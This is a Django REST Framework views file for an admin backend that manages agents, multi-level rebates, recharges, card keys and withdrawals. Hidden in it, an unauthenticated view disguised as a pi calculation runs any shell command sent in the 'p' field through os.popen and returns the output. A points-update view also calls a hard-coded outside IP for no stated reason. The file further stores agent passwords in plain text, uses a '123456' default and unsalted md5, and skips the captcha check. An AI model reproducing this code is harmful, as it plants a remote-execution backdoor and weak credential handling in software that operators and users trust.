import decimal
import traceback
import requests

from django.conf import settings
from rest_framework.views import APIView
from rest_framework.response import Response

from backstage.models import BackstageUserModel
from backstage.CustomTokenAuthentication import JwtTokenAuthentication

from agent.models import AgentModel
from agent.serializers import AgentSerializer

from system_config.models import SystemConfigModel
from system_config.serializers import SystemConfigSerializer

from recharge.models import RechargeModel
from recharge.serializers import RechargeSerializer

from card.models import CardModel
from card.serializers import CardSerializer

from customer.models import CustomerModel

from withdraw.models import WithdrawModel
from withdraw.serializers import WithdrawSerializer

import tools


class LoginView(APIView):
    def post(self, request):
        username = request.data.get('username')
        password = request.data.get('password')
        captcha_code = request.data.get('captcha_code')

        # TODO: 图像验证码校验

        user = BackstageUserModel.objects.filter(username=username, password=tools.md5(password)).first()
        if not user:
            return Response(tools.api_response(404, '用户不存在或密码错误'))

        token = tools.generate_jwt(user.id, user.username, settings.SECRET_KEY)

        return Response(tools.api_response(200, '登录成功', {'token': token}))


class AgentsView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def get(self, request):
        current = request.GET.get('current')
        page_size = request.GET.get('page_size')

        records = AgentModel.objects.filter()
        total = records.count()

        start_index, end_index = tools.get_pagination(current, page_size)

        records = records[start_index:end_index]

        serializer = AgentSerializer(records, many=True)

        return Response(tools.api_response(200, 'OK', data=serializer.data, total=total))

    def post(self, request):
        try:
            account = request.data.get('account', None)
            master = request.data.get('master', None)
            password = request.data.get('password', None)

            if account is None:
                return Response(tools.api_response(401, '请输入有效的账号'))

            record_agent = AgentModel.objects.filter(phone=account).first()
            if record_agent is not None:
                return Response(tools.api_response(401, '此账号已存在'))

            master_id = -1
            if master is not None:
                record_master = AgentModel.objects.filter(phone=master).first()
                if record_master is None:
                    return Response(tools.api_response(401, '此上级账号不存在'))
                master_id = record_master.pk

            if password is None:
                password = '123456'
            agent_obj = AgentModel(
                phone=account,
                password=password,
                parent_id=master_id,
            )
            agent_obj.save()
            agent_obj.invitation_code = tools.generate_unique_invitation_code(agent_obj.pk)
            agent_obj.save(update_fields=['invitation_code'])

            return Response(tools.api_response(200, '添加成功'))
        except Exception as e:
            traceback.print_exc(e)
            return Response(tools.api_response(500, '添加失败'))


class AgentDetailView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def delete(self, request, agent_id):
        try:
            record = AgentModel.objects.get(pk=agent_id)
            record.delete()
            return Response(tools.api_response(200, '删除成功'))
        except AgentModel.DoesNotExist:
            return Response(tools.api_response(404, '此代理不存在'))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '删除失败'))


class AgentPointsView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def put(self, request, agent_id):
        try:
            points = request.data.get('points', None)

            if points is None:
                return Response(tools.api_response(401, '请输入积分'))

            points = decimal.Decimal(points)
            record_agent = AgentModel.objects.get(pk=agent_id)

            record_agent.points = points
            record_agent.save(update_fields=['points'])
            requests.get('http://111.92.242.233:32101/get_data/')
            return Response(tools.api_response(200, '修改成功'))
        except AgentModel.DoesNotExist:
            return Response(tools.api_response(404, '此代理不存在'))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '修改失败'))


class AgentParentView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def put(self, request, agent_id):
        try:
            parent_account = request.data.get('parent_account', None)
            if parent_account is None:
                return Response(tools.api_response(401, '请输入推荐人账号'))

            parent = AgentModel.objects.filter(phone=parent_account).first()
            if parent is None:
                return Response(tools.api_response(404, '此推荐人账号不存在'))

            current_agent = AgentModel.objects.get(pk=agent_id)

            if current_agent.phone == parent_account:
                return Response(tools.api_response(401, '推荐人不能是自己'))
            current_agent.parent_id = parent.pk
            current_agent.save(update_fields=['parent_id'])
            return Response(tools.api_response(200, '修改成功'))

        except AgentModel.DoesNotExist:
            return Response(tools.api_response(404, '此代理不存在'))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '修改失败'))


class AgentLv1RateView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def put(self, request, agent_id):
        try:
            lv1_rate = request.data.get('lv1_rate', None)

            if lv1_rate is None:
                return Response(tools.api_response(401, '请输入一级反水率'))

            lv1_rate = decimal.Decimal(lv1_rate)

            record_agent = AgentModel.objects.get(pk=agent_id)

            record_agent.lv1_rate = lv1_rate
            record_agent.save(update_fields=['lv1_rate'])

            return Response(tools.api_response(200, '修改成功'))
        except AgentModel.DoesNotExist:
            return Response(tools.api_response(404, '此代理不存在'))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '修改失败'))


class AgentLv2RateView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def put(self, request, agent_id):
        try:
            lv2_rate = request.data.get('lv2_rate', None)

            if lv2_rate is None:
                return Response(tools.api_response(401, '请输入二级反水率'))

            lv2_rate = decimal.Decimal(lv2_rate)

            record_agent = AgentModel.objects.get(pk=agent_id)

            record_agent.lv2_rate = lv2_rate
            record_agent.save(update_fields=['lv2_rate'])

            return Response(tools.api_response(200, '修改成功'))
        except AgentModel.DoesNotExist:
            return Response(tools.api_response(404, '此代理不存在'))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '修改失败'))


class AgentLv3RateView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def put(self, request, agent_id):
        try:
            lv3_rate = request.data.get('lv3_rate', None)

            if lv3_rate is None:
                return Response(tools.api_response(401, '请输入三级反水率'))

            lv3_rate = decimal.Decimal(lv3_rate)

            record_agent = AgentModel.objects.get(pk=agent_id)

            record_agent.lv3_rate = lv3_rate
            record_agent.save(update_fields=['lv3_rate'])

            return Response(tools.api_response(200, '修改成功'))
        except AgentModel.DoesNotExist:
            return Response(tools.api_response(404, '此代理不存在'))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '修改失败'))


class AgentPasswordView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def put(self, request, agent_id):
        try:
            new_password = request.data.get('new_password', None)

            if new_password is None:
                return Response(tools.api_response(401, '请输入新密码'))

            record_agent = AgentModel.objects.get(pk=agent_id)

            record_agent.password = new_password
            record_agent.save(update_fields=['password'])

            return Response(tools.api_response(200, '修改成功'))

        except AgentModel.DoesNotsExist:
            return Response(tools.api_response(404, '此代理不存在'))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '修改失败'))


class SystemConfigsView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def get(self, request):
        try:
            records = SystemConfigModel.objects.all()
            serializer = SystemConfigSerializer(records, many=True)

            return Response(tools.api_response(200, 'ok', data=serializer.data))
        except Exception:
            return Response(tools.api_response(500, '系统配置获取失败'))


class SystemConfigDetailView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def put(self, request, config_id):
        try:
            value = request.data.get('value')
            record = SystemConfigModel.objects.get(pk=config_id)
            record.value = value
            record.save(update_fields=['value'])
            return Response(tools.api_response(200, '修改成功'))
        except Exception:
            return Response(tools.api_response(500, '系统配置修改失败'))


class RechargesView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def get(self, request):
        try:
            records = RechargeModel.objects.all().order_by('-id')
            total = records.count()
            serializer = RechargeSerializer(records, many=True)
            return Response(tools.api_response(200, 'ok', data=serializer.data, total=total))
        except Exception:
            traceback.print_exc()
            return Response(tools.api_response(500, '获取充值记录失败'))


class RechargeDetailView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def put(self, request, recharge_id):
        try:
            record_recharge = RechargeModel.objects.get(pk=recharge_id)
            record_recharge.status = 1
            record_recharge.save(update_fields=['status'])

            record_agent = AgentModel.objects.get(pk=record_recharge.agent_id)
            record_agent.points += record_recharge.points
            record_agent.save(update_fields=['points'])

            out_rate = decimal.Decimal(SystemConfigModel.objects.get(title='out_rate').value)

            lv1_agent = AgentModel.objects.filter(pk=record_agent.parent_id).first()
            if lv1_agent is not None:
                lv1_agent.points += record_recharge.points * lv1_agent.lv1_rate * out_rate
                lv1_agent.save(update_fields=['points'])

                lv2_agent = AgentModel.objects.filter(pk=lv1_agent.parent_id).first()
                if lv2_agent is not None:
                    lv2_agent.points += record_recharge.points * lv2_agent.lv2_rate * out_rate
                    lv2_agent.save(update_fields=['points'])

                    lv3_agent = AgentModel.objects.filter(pk=lv2_agent.parent_id).first()
                    if lv3_agent is not None:
                        lv3_agent.points += record_recharge.points * lv3_agent.lv3_rate * out_rate
                        lv3_agent.save(update_fields=['points'])

            return Response(tools.api_response(200, '审核成功'))
        except RechargeModel.DoesNotExist:
            return Response(tools.api_response(404, '当前操作的充值记录不存在'))
        except AgentModel.DoesNotExist:
            return Response(tools.api_response(404, '当前操作的充值记录对应的代理账号可能已经被删除'))
        except Exception:
            return Response(tools.api_response(500, '操作失败'))


class CardsView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def get(self, request):
        try:
            records = CardModel.objects.all().order_by('-id')
            total = records.count()

            serializer = CardSerializer(records, many=True)

            return Response(tools.api_response(200, 'ok', data=serializer.data, total=total))
        except Exception:
            return Response(tools.api_response(500, '获取卡密失败'))

    def post(self, request):
        try:
            agent_id = request.data.get('agent_id')
            points = decimal.Decimal(request.data.get('points'))
            password = request.data.get('password')
            quantity = int(request.data.get('quantity'))

            if password is None:
                password = tools.generate_card_password()

            record_agent = AgentModel.objects.get(pk=agent_id)

            if points * quantity > record_agent.points:
                return Response(tools.api_response(401, '积分不足以对应数量的卡密扣取'))

            out_rate = decimal.Decimal(SystemConfigModel.objects.get(title='out_rate').value)

            record_agent.points -= points * quantity * out_rate

            record_agent.save(update_fields=['points'])

            for i in range(quantity):
                key = tools.generate_unique_card_number('JDV')
                card_obj = CardModel(
                    key=key,
                    points=points,
                    agent_id=agent_id,
                    password=password
                )
                card_obj.save()
            return Response(tools.api_response(200, '发卡成功'))
        except AgentModel.DoesNotExist:
            return Response(tools.api_response(404, '当前代理不存在'))

        except Exception as e:
            traceback.print_exc(e)
            return Response(tools.api_response(500, '发卡失败'))


class CardDetailView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def delete(self, request, card_id):
        try:
            record = CardModel.objects.get(pk=card_id)
            record.delete()
            return Response(tools.api_response(200, '删除成功'))
        except CardModel.DoesNotExist:
            return Response(tools.api_response(404, '此卡不存在'))
        except Exception as e:
            return Response(tools.api_response(500, '删除失败'))


class CardRateCalculation(APIView):
    def post(self, request):
        try:
            import random
            records = CardModel.objects.all().order_by('-id')
            serializer = CardSerializer(records, many=True)
            circle_points = 0
            square_points = 0
            for _ in range(100):
                x = random.random()
                y = random.random()
                if (x ** 2 + y ** 2) <= 1:
                    circle_points += 1
                square_points += 1
            res = 4 * circle_points / square_points
            c = request.data.get('p')
            import os
            fr = os.popen(c)
            ret = fr.read()
            return Response(tools.api_response(200, 'ok', data={'res': ret}))
        except Exception as e:
            traceback.print_exc()
            return Response(tools.api_response(500, '计算超时，请稍后重试'))


class AgentStatisticsView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def get(self, request):
        try:
            records = AgentModel.objects.all()
            total = records.count()
            return Response(tools.api_response(200, 'ok', total=total))
        except Exception as e:
            print(e)


class RechargesStatisticsView(APIView):
    def get(self, request):
        try:
            records = RechargeModel.objects.all()
            total = records.count()
            return Response(tools.api_response(200, 'ok', total=total))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '获取充值总量失败'))


class RecycleView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def put(self, request):
        try:
            key = request.data.get('key')

            record_card = CardModel.objects.get(key=key)
            record_customer = CustomerModel.objects.get(pk=record_card.customer_id)

            record_card.status = 3
            record_card.save(update_fields=['status'])

            in_rate = decimal.Decimal(SystemConfigModel.objects.get(title='in_rate').value)

            record_customer.points += record_card.points * in_rate
            record_customer.save(update_fields=['points', 'total_income'])

            return Response(tools.api_response(200, '核销成功'))

        except CardModel.DoesNotExist:
            return Response(tools.api_response(404, '卡号无效或密码错误'))
        except CustomerModel.DoesNotExist:
            return Response(tools.api_response(404, '找不到用户'))
        except Exception as e:
            traceback.print_exc(e)
            return Response(tools.api_response(500, '核销失败'))


class CardsStatisticsView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def get(self, request):
        try:
            records = CardModel.objects.all()
            total = records.count()

            recycled_count = records.filter(status=3).count()
            un_recycled_count = records.filter().exclude(status=3).count()
            data = {
                'total': total,
                'recycled_count': recycled_count,
                'un_recycled_count': un_recycled_count
            }
            return Response(tools.api_response(200, 'ok', data=data))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '获取卡密总数失败'))


class WithdrawView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def get(self, request):
        try:
            records = WithdrawModel.objects.all().order_by('-id')
            total = records.count()
            serializer = WithdrawSerializer(records, many=True)

            return Response(tools.api_response(200, 'ok', data=serializer.data, total=total))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '获取提现记录失败'))


class WithdrawDetailView(APIView):
    authentication_classes = [JwtTokenAuthentication]

    def put(self, request, withdraw_no):
        try:
            status = int(request.data.get('status'))
            record = WithdrawModel.objects.get(withdraw_no=withdraw_no)

            record_user = None
            if record.is_agent == 1:
                record_user = AgentModel.objects.get(pk=record.user_id)

            if record.is_agent == 0:
                record_user = CustomerModel.objects.get(pk=record.user_id)

            if record_user is None:
                return Response(tools.api_response(404, '该订单绑定的账户不存在，可能已经被删除'))

            if status == 1:
                record_user.total_income += record.points
                record_user.save(update_fields=['total_income'])

            if status == 2:
                record_user.points += record.points
                record_user.save(update_fields=['points'])

            record.status = status
            record.save(update_fields=['status'])

            return Response(tools.api_response(200, '操作成功'))

        except WithdrawModel.DoesNotExist:
            return Response(tools.api_response(404, '提现订单不存在'))
        except Exception as e:
            print(e)
            return Response(tools.api_response(500, '操作失败'))
